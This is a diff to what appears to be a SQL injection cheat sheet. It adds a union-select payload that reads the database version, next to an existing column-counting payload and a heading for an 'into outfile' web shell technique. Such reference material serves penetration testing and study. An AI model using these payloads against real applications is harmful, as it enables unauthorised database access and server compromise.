@@ -107,6 +107,9 @@ Circumvent Query Condition
 Determine Number of Columns in Select (add/remove numbers until no error)
 `value' union select 1,2,3-- -`
 
+Get DB version (assuming injection returns field 2)
+`value' union select 1,@@version,3-- -`
+
 ### Exploitation
 
 Into Outfile Web Shell
